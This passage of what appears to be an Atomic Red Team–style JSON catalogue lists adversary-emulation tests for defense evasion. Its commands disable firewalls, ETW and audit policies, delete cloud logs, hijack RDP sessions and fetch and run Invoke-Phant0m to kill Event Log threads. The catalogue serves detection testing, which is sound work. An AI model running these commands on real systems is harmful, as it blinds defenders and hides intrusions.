"clacwm17b000029mqcwg1etc9", "description": "[RDP hijacking](https://medium.com/@networksecurity/rdp-hijacking-how-to-hijack-rds-and-remoteapp-sessions-transparently-to-move-through-an-da2a1e73a5f6) - how to hijack RDS and RemoteApp sessions transparently to move through an organization\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | Session_ID | The ID of the session to which you want to connect | String | 1337 | \n | Destination_ID | Connect the session of another user to a different session | String | rdp-tcp#55 | "}, "executionSteps": [{"description": "query user\nsc.exe create sesshijack binpath= \"cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}\"\nnet start sesshijack\n", "successCriteria": null}], "techniqueIds": ["clacwm6qg03r929mqdxbbf3pa", "clacwm2av00q029mq2m0t8rqf"], "tags": []}, {"data": {"name": "Office 365 - Exchange Audit Log Disabled", "shortName": "T1562.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "You can use the Exchange Management Shell to enable or disable mailbox audit logging for a mailbox.\nUnified or Admin Audit logs are disabled via the Exchange Powershell cmdline.\nhttps://github.com/Azure/Azure-Sentinel/blob/master/Detections/OfficeActivity/exchange_auditlogdisabled.yaml\n\n\n**Supported Platforms:** office-365\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | office-365 username | String | null | \n | password | office-365 password | String | null | "}, "executionSteps": [{"description": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-ExchangeOnline -Credential $creds\nSet-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $False\n", "successCriteria": null}], "techniqueIds": ["clacwm6n503np29mq8gkr9qwb"], "tags": []}, {"data": {"name": "Azure - Eventhub Deletion", "shortName": "T1562.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identifies an Event Hub deletion in Azure.\nAn Event Hub is an event processing service that ingests and processes large volumes of events and data.\nAn adversary may delete an Event Hub in an attempt to evade detection.\nhttps://docs.microsoft.com/en-us/azure/event-hubs/event-hubs-about.\n\n\n**Supported Platforms:** iaas:azure\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | username | Azure username | String | null | \n | password | Azure password | String | null | \n | event_hub_name | Name of the eventhub | String | test_eventhub | \n | resource_group | Name of the resource group | String | null | \n | name_space_name | Name of the NameSpace | String | null | "}, "executionSteps": [{"description": "$secure_pwd = \"#{password}\" | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $secure_pwd\nConnect-AzureAD -Credential $creds\nNew-AzEventHub -ResourceGroupName #{resource_group} -NamespaceName #{name_space_name} -Name #{event_hub_name}\nRemove-AzEventHub -ResourceGroupName #{resource_group} -Namespace #{name_space_name} -Name #{event_hub_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6n503np29mq8gkr9qwb"], "tags": []}, {"data": {"name": "AWS CloudWatch Log Stream Deletes", "shortName": "T1562.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new cloudWatch log stream in AWS, Upon successful creation it will Delete the stream. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-stream-deletion.html\n\n\n**Supported Platforms:** iaas:aws\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cloudwatch_log_group_name | Name of the cloudWatch log group | String | test-logs | \n | cloudwatch_log_stream_name | Name of the cloudWatch log stream | String | 20150601 | \n | region | Name of the region | String | us-west-2 | "}, "executionSteps": [{"description": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs create-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}\necho \"*** Log Stream Created ***\"\naws logs delete-log-stream --log-group-name #{cloudwatch_log_group_name} --log-stream-name #{cloudwatch_log_stream_name}\necho \"*** Log Stream Deleted ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6n503np29mq8gkr9qwb"], "tags": []}, {"data": {"name": "AWS - Remove VPC Flow Logs using Stratus", "shortName": "T1562.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This Atomic will attempt to remove AWS VPC Flow Logs configuration. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | stratus_path | Path of stratus binary | Path | $PathToAtomicsFolder/T1562.008/src | \n | aws_region | AWS region to detonate | String | us-west-2 | "}, "executionSteps": [{"description": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.vpc-remove-flow-logs\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.vpc-remove-flow-logs --force\n", "successCriteria": null}], "techniqueIds": ["clacwm6n503np29mq8gkr9qwb"], "tags": []}, {"data": {"name": "AWS - Disable CloudTrail Logging Through Event Selectors using Stratus", "shortName": "T1562.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Update event selectors in AWS CloudTrail to disable the logging of certain management events to evade defense. This Atomic test leverages a tool called Stratus-Red-Team built by DataDog (https://github.com/DataDog/stratus-red-team). Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. Ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-event-selectors/\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | stratus_path | Path of stratus binary | Path | $PathToAtomicsFolder/T1562.008/src | \n | aws_region | AWS region to detonate | String | us-west-2 | "}, "executionSteps": [{"description": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-event-selectors\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-event-selectors --force\n", "successCriteria": null}], "techniqueIds": ["clacwm6n503np29mq8gkr9qwb"], "tags": []}, {"data": {"name": "AWS - CloudWatch Log Stream Deletes", "shortName": "T1562.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new CloudWatch log group in AWS, Upon successful creation it will Delete the group. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-group-deletion.html#aws-cloudwatch-log-group-deletion\n\n\n**Supported Platforms:** iaas:aws\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cloudwatch_log_group_name | Name of the cloudWatch log group | String | log-test | \n | region | Name of the region | String | us-east-1 | "}, "executionSteps": [{"description": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6n503np29mq8gkr9qwb"], "tags": []}, {"data": {"name": "AWS - CloudWatch Log Group Deletes", "shortName": "T1562.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new cloudWatch log group in AWS, Upon successful creation it will Delete the group. Attackers can use this technique to evade defenses by \ndeleting the log stream. Once it is deleted, the logs created by the attackers will not be logged. https://www.elastic.co/guide/en/security/current/aws-cloudwatch-log-group-deletion.html#aws-cloudwatch-log-group-deletion\n\n\n**Supported Platforms:** iaas:aws\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cloudwatch_log_group_name | Name of the cloudWatch log group | String | log-test | \n | region | Name of the region | String | us-east-1 | "}, "executionSteps": [{"description": "aws logs create-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Created ***\"\naws logs delete-log-group --log-group-name #{cloudwatch_log_group_name} --region #{region} --output json\necho \"*** Log Group Deleted ***\"\n", "successCriteria": null}], "techniqueIds": ["clacwm6n503np29mq8gkr9qwb"], "tags": []}, {"data": {"name": "AWS - CloudTrail Logs Impairment Through S3 Lifecycle Rule using Stratus", "shortName": "T1562.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This Atomic test will use the Stratus Red Team will first setup a CloudTrail logging into an S3 bucket and will then make an API call to update the lifecycle rule on that S3 bucket with an expiration date of 1 day. This will essentially delete all the logs after one day. Adversaries often do this actiivity to evade detection. Stratus Red Team is a self-contained binary. You can use it to easily detonate offensive attack techniques against a live cloud environment. ref: https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.cloudtrail-lifecycle-rule/\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | stratus_path | Path of stratus binary | Path | $PathToAtomicsFolder/T1562.008/src | \n | aws_region | AWS region to detonate | String | us-west-2 | "}, "executionSteps": [{"description": "export AWS_REGION=#{aws_region} \ncd #{stratus_path}\necho \"starting warmup\"\n./stratus warmup aws.defense-evasion.cloudtrail-lifecycle-rule\necho \"starting detonate\"\n./stratus detonate aws.defense-evasion.cloudtrail-lifecycle-rule --force\n", "successCriteria": null}], "techniqueIds": ["clacwm6n503np29mq8gkr9qwb"], "tags": []}, {"data": {"name": "AWS - CloudTrail Changes", "shortName": "T1562.008", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Creates a new cloudTrail in AWS, Upon successful creation it will Update,Stop and Delete the cloudTrail\n\n\n**Supported Platforms:** iaas:aws\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | cloudtrail_name | Name of the cloudTrail | String | redatomictesttrail | \n | s3_bucket_name | Name of the bucket | String | redatomic-test | \n | region | Name of the region | String | us-east-1 | "}, "executionSteps": [{"description": "aws cloudtrail create-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name} --region #{region}\naws cloudtrail update-trail --name #{cloudtrail_name} --s3-bucket-name #{s3_bucket_name}  --is-multi-region-trail --region #{region}\naws cloudtrail stop-logging --name #{cloudtrail_name} --region #{region}\naws cloudtrail delete-trail --name #{cloudtrail_name} --region #{region}\n", "successCriteria": null}], "techniqueIds": ["clacwm6n503np29mq8gkr9qwb"], "tags": []}, {"data": {"name": "Logging Configuration Changes on Linux Host", "shortName": "T1562.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Emulates modification of syslog configuration.\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | syslog_config_file_name | The name of the syslog configuration file to be changed | String | syslog.conf | \n | rsyslog_config_file_name | The name of the rsyslog configuration file to be changed | String | rsyslog.conf | \n | syslog_ng_config_file_name | The name of the syslog-ng configuration file to be changed | String | syslog-ng.conf | "}, "executionSteps": [{"description": "if [ -f \"/etc/#{syslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{syslog_config_file_name}\nfi\nif [ -f \"/etc/#{rsyslog_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/#{rsyslog_config_file_name}\nfi\nif [ -f \"/etc/syslog-ng/#{syslog_ng_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_2' /etc/syslog-ng/#{syslog_ng_config_file_name}\nfi\n", "successCriteria": null}], "techniqueIds": ["clacwm6a1038x29mq5r9g0i3z", "clacwm1ym00go29mq8bd67mqk"], "tags": []}, {"data": {"name": "LockBit Black - Disable the ETW Provider of Windows Defender -Powershell", "shortName": "T1562.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" -Name Operational  -PropertyType DWord -Value 0 -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm6a1038x29mq5r9g0i3z"], "tags": []}, {"data": {"name": "LockBit Black - Disable the ETW Provider of Windows Defender -cmd", "shortName": "T1562.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary can disable the ETW Provider of Windows Defender,\nso nothing would be logged to Microsoft-Windows-Windows-Defender/Operational anymore.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-Windows Defender\" /v Operational /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm6a1038x29mq5r9g0i3z"], "tags": []}, {"data": {"name": "Disable Powershell ETW Provider - Windows", "shortName": "T1562.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test was created to disable the Microsoft Powershell ETW provider by using the built-in Windows tool, logman.exe. This provider is used as a common source of telemetry in AV/EDR solutions.\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ps_exec_location | Location of PSExec. | string | $env:temp\\pstools\\PsExec.exe | \n | session | The session to disable. | string | EventLog-Application | \n | provider | The provider to disable. | string | Microsoft-Windows-Powershell | "}, "executionSteps": [{"description": "cmd /c \"#{ps_exec_location}\" -accepteula -i -s cmd.exe /c logman update trace \"#{session}\" --p \"#{provider}\" -ets", "successCriteria": null}], "techniqueIds": ["clacwm6a1038x29mq5r9g0i3z"], "tags": []}, {"data": {"name": "Disable .NET Event Tracing for Windows Via Registry (powershell)", "shortName": "T1562.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables ETW for the .NET Framework using PowerShell to update the Windows registry\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty -Path HKLM:\\Software\\Microsoft\\.NETFramework -Name ETWEnabled -Value 0 -PropertyType \"DWord\" -Force", "successCriteria": null}], "techniqueIds": ["clacwm6a1038x29mq5r9g0i3z"], "tags": []}, {"data": {"name": "Disable .NET Event Tracing for Windows Via Registry (cmd)", "shortName": "T1562.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables ETW for the .NET Framework using the reg.exe utility to update the Windows registry\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "REG ADD HKLM\\Software\\Microsoft\\.NETFramework /v ETWEnabled /t REG_DWORD /d 0", "successCriteria": null}], "techniqueIds": ["clacwm6a1038x29mq5r9g0i3z"], "tags": []}, {"data": {"name": "Auditing Configuration Changes on Linux Host", "shortName": "T1562.006", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Emulates modification of auditd configuration files\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | audisp_config_file_name | The name of the audispd configuration file to be changed | String | audispd.conf | \n | auditd_config_file_name | The name of the auditd configuration file to be changed | String | auditd.conf | \n | libaudit_config_file_name | The name of the libaudit configuration file to be changed | String | libaudit.conf | "}, "executionSteps": [{"description": "sed -i '$ a #art_test_1562_006_1' /etc/audisp/#{audisp_config_file_name}\nif [ -f \"/etc/#{auditd_config_file_name}\" ];\nthen sed -i '$ a #art_test_1562_006_1' /etc/#{auditd_config_file_name}\nelse sed -i '$ a #art_test_1562_006_1' /etc/audit/#{auditd_config_file_name}\nfi \nsed -i '$ a #art_test_1562_006_1' /etc/#{libaudit_config_file_name}\n", "successCriteria": null}], "techniqueIds": ["clacwm6a1038x29mq5r9g0i3z", "clacwm1ym00go29mq8bd67mqk"], "tags": []}, {"data": {"name": "Turn off UFW logging", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Turn off the Uncomplicated Firewall (UFW) logging. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "ufw logging off\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Tail the UFW firewall log file", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Print  the last 10 lines of the Uncomplicated Firewall (UFW) log file \n/var/log/ufw.log.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "tail /var/log/ufw.log\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Stop/Start UFW firewall systemctl", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stop the Uncomplicated Firewall (UFW) if installed, using systemctl. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "systemctl stop ufw\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Stop/Start UFW firewall", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Stop the Uncomplicated Firewall (UFW) if installed.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "ufw disable\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Opening ports for proxy - HARDRAIN", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test creates a listening interface on a victim device. This tactic was used by HARDRAIN for proxying.\n\nreference: https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-F.pdf\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "netsh advfirewall firewall add rule name=\"atomic testing\" action=allow dir=in protocol=TCP localport=450 \n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0", "clacwm1of00a629mqapdi7q7a"], "tags": []}, {"data": {"name": "Open a local port through Windows Firewall to any profile", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test will attempt to open a local port defined by input arguments to any profile\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | local_port | This is the local port you wish to test opening | Integer | 3389 | "}, "executionSteps": [{"description": "netsh advfirewall firewall add rule name=\"Open Port to Any\" dir=in protocol=tcp localport=#{local_port} action=allow profile=any", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0", "clacwm1of00a629mqapdi7q7a"], "tags": []}, {"data": {"name": "LockBit Black - Unusual Windows firewall registry modification -Powershell", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary tries to modify the windows firewall registry.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" -Name EnableFirewall -PropertyType DWORD -Value 0 -Force\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "LockBit Black - Unusual Windows firewall registry modification -cmd", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "An adversary tries to modify the windows firewall registry\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\nreg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile\" /v EnableFirewall /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Edit UFW firewall user.rules file", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Edit the Uncomplicated Firewall (UFW) rules file /etc/ufw/user.rules.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/user.rules\ngrep \"# THIS IS A COMMENT\" /etc/ufw/user.rules\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Edit UFW firewall ufw.conf file", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Edit the Uncomplicated Firewall (UFW) configuration file /etc/ufw/ufw.conf \nwhich controls if the firewall starts on boot and its logging level.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/ufw.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/ufw.conf\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Edit UFW firewall sysctl.conf file", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Edit the Uncomplicated Firewall (UFW) configuration file for setting network \nvariables /etc/ufw/sysctl.conf.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "echo \"# THIS IS A COMMENT\" >> /etc/ufw/sysctl.conf\ngrep \"# THIS IS A COMMENT\" /etc/ufw/sysctl.conf\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Edit UFW firewall main configuration file", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Edit the Uncomplicated Firewall (UFW) main configuration file for setting \ndefault policies /etc/default/ufw.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "echo \"# THIS IS A COMMENT\" >> /etc/default/ufw\ngrep \"# THIS IS A COMMENT\" /etc/default/ufw\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Disable Microsoft Defender Firewall via Registry", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables the Microsoft Defender Firewall for the public profile via registry\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Disable Microsoft Defender Firewall", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables the Microsoft Defender Firewall for the current profile.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will re-enable firewall for the current profile...\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "netsh advfirewall set currentprofile state off\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0", "clacwm1of00a629mqapdi7q7a"], "tags": []}, {"data": {"name": "Disable iptables firewall", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables the iptables firewall\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"6\" ];\nthen\n  service iptables stop\n  chkconfig off iptables\n  service ip6tables stop\n  chkconfig off ip6tables\nelse if [ $(rpm -q --queryformat '%{VERSION}' centos-release) -eq \"7\" ];\n  systemctl stop firewalld\n  systemctl disable firewalld\nfi\n", "successCriteria": null}], "techniqueIds": ["clacwm1of00a629mqapdi7q7a"], "tags": []}, {"data": {"name": "Allow SMB and RDP on Microsoft Defender Firewall", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Allow all SMB and RDP rules on the Microsoft Defender Firewall for all profiles.\nCaution if you access remotely the host where the test runs! Especially with the cleanup command which will reset the firewall and risk disabling those services...\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "netsh advfirewall firewall set rule group=\"remote desktop\" new enable=Yes\nnetsh advfirewall firewall set rule group=\"file and printer sharing\" new enable=Yes\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0", "clacwm1of00a629mqapdi7q7a"], "tags": []}, {"data": {"name": "Allow Executable Through Firewall Located in Non-Standard Location", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test will attempt to allow an executable through the system firewall located in the Users directory\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | exe_file_path | path to exe file | Path | PathToAtomicsFolder\\T1562.004\\bin\\AtomicTest.exe | "}, "executionSteps": [{"description": "Copy-Item #{exe_file_path} -Destination \"C:\\Users\\$env:UserName\" -Force\nnetsh advfirewall firewall add rule name=\"Atomic Test\" dir=in action=allow program=\"C:\\Users\\$env:UserName\\AtomicTest.exe\" enable=yes\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0", "clacwm1of00a629mqapdi7q7a"], "tags": []}, {"data": {"name": "Add and delete UFW firewall rules", "shortName": "T1562.004", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add and delete a rule on the Uncomplicated Firewall (UFW) if installed and enabled. \n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "ufw prepend deny from 1.2.3.4\nufw status numbered\n", "successCriteria": null}], "techniqueIds": ["clacwm648032u29mqevd1htt0"], "tags": []}, {"data": {"name": "Mac HISTCONTROL", "shortName": "T1562.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The HISTCONTROL variable is set to ignore (not write to the history file) command that are a duplicate of something already in the history \nand commands that start with a space. This atomic sets this variable in the current session and also writes it to the current user's ~/.bash_profile \nso that it will apply to all future settings as well.\nhttps://www.linuxjournal.com/content/using-bash-history-more-efficiently-histcontrol\n\n\n**Supported Platforms:** macos, linux\n\n"}, "executionSteps": [{"description": "1. export HISTCONTROL=ignoreboth\n2. echo export \"HISTCONTROL=ignoreboth\" >> ~/.bash_profile\n3. ls\n4. whoami > recon.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm6ef03do29mq8tk4hk33", "clacwm1y700gi29mqc8p57okr"], "tags": []}, {"data": {"name": "Disable history collection", "shortName": "T1562.003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables history collection in shells\n\n\n**Supported Platforms:** linux, macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | evil_command | Command to run after shell history collection is disabled | String | whoami | "}, "executionSteps": [{"description": "export HISTCONTROL=ignoreboth\n#{evil_command}\n", "successCriteria": null}], "techniqueIds": ["clacwm6ef03do29mq8tk4hk33", "clacwm1y700gi29mqc8p57okr"], "tags": []}, {"data": {"name": "Makes Eventlog blind with Phant0m", "shortName": "T1562.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | file_name | exe version of Phant0m | Path | PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe | "}, "executionSteps": [{"description": "PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe\n", "successCriteria": null}], "techniqueIds": ["clacwm62y031p29mq82w0g5g3"], "tags": []}, {"data": {"name": "Kill Event Log Service Threads", "shortName": "T1562.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n", "successCriteria": null}], "techniqueIds": ["clacwm62y031p29mq82w0g5g3", "clacwm1o900a229mqc29wf91o"], "tags": []}, {"data": {"name": "Impair Windows Audit Log Policy", "shortName": "T1562.002", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set 